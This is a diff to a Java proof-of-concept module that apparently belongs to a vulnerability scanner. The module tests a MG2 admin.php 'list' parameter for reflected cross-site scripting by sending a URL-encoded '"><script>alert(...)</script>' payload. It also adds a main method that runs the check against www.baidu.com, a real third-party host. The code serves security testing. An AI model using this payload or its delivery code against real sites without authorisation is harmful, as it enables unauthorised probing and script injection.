@@ -1,6 +1,7 @@
 package cn.com.sgcc.marki_with_maven.modules;
 
 import java.io.IOException;
+import java.net.URLEncoder;
 import java.security.KeyManagementException;
 import java.security.NoSuchAlgorithmException;
 import java.util.HashMap;
@@ -77,7 +78,8 @@ public class MG2_list_Parameter_xss implements IPocBase {
 		String serviceVersion = (String) infodict.get("service_version");
 		CloseableHttpClient customClient = null;
 		try {
-			String url = String.format("%s://%s:%s/admin.php?action=import&list=\"><script>alert(e165421110ba03099a1c0393373c5b43);</script>", serviceType.contains("https") ? "https":"http", ip, port );
+			String url = String.format("%s://%s:%s/admin.php?action=import&list=", serviceType.contains("https") ? "https":"http", ip, port );
+			url = url + URLEncoder.encode("\"><script>alert(e165421110ba03099a1c0393373c5b43);</script>");
 			HttpGet httpGet = new HttpGet(url);
 			customClient = new NetWorkTools().getCustomClient();
 			CloseableHttpResponse resp = customClient.execute(httpGet);
@@ -108,6 +110,18 @@ public class MG2_list_Parameter_xss implements IPocBase {
 			}
 		}
 		return ismatch;
+	}
+	
+	public static void main(String[] args) {
+		// TODO Auto-generated method stub
+		Map infodict = new HashMap<String, String>();
+		infodict.put("ip", "www.baidu.com");
+		infodict.put("port", "80");
+		infodict.put("service_type", "http");
+		infodict.put("service_version", "topsec");
+		MG2_list_Parameter_xss mg2_list_Parameter_xss = new MG2_list_Parameter_xss();
+		mg2_list_Parameter_xss.match(infodict);
+		System.out.println(mg2_list_Parameter_xss.verify(infodict));
 	}
 
 }
